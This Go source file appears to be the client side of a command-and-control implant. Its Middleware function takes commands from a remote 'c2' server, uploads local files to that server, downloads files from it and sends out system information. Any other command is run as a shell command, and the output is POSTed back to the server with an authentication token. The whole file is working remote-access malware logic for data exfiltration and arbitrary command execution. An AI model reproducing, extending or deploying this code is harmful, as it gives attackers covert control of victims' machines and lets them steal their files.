package client

import (
	"bytes"
	"log"
	"net/http"
	"os"
	"strings"
)

// Middleware splits of the flow corresponding to the cmd
// string and delegates to the method that is repsonsible for
// taking out the action.
func Middleware(client *http.Client, cmd string, host string) {
	if strings.Compare(cmd, "quit") == 0 {
		log.Println("[+] Quitting due to quit cmd from c2")
		os.Exit(0)
	} else if strings.HasPrefix(cmd, "__upload__") {
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			log.Println("[-] Invalid upload command syntax.")
		} else {
			localFilePath := cmdTokens[1]
			remoteFilePath := cmdTokens[2]
			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
		}
	} else if strings.HasPrefix(cmd, "__download__") {
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			log.Println("[-] Invalid download command syntax.")
		} else {
			remoteFilePath := cmdTokens[1]
			localFilePath := cmdTokens[2]
			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
		}
	} else if strings.HasPrefix(cmd, "__sysinfo__") {
		log.Printf("[+] Sending system information...")
		sysInfo := GetCurrentSysInfo()
		SendSysInfo(client, host+sysInfoURL, sysInfo)
	} else {
		out := ExecAndGetOutput(string(cmd))
		log.Printf("[+] Sending back output:\n%s\n", string(out))
		req, err := http.NewRequest("POST", host+cmdOutputURL, bytes.NewBuffer(out))
		if err != nil {
			log.Printf("[-] Error creating the POST request: %s\n", err)
			return
		}

		req.Header.Add("Token", ClientToken)
		req.Header.Set("Content-Type", "text/html")

		client.Do(req)
	}
	defer client.CloseIdleConnections()
}
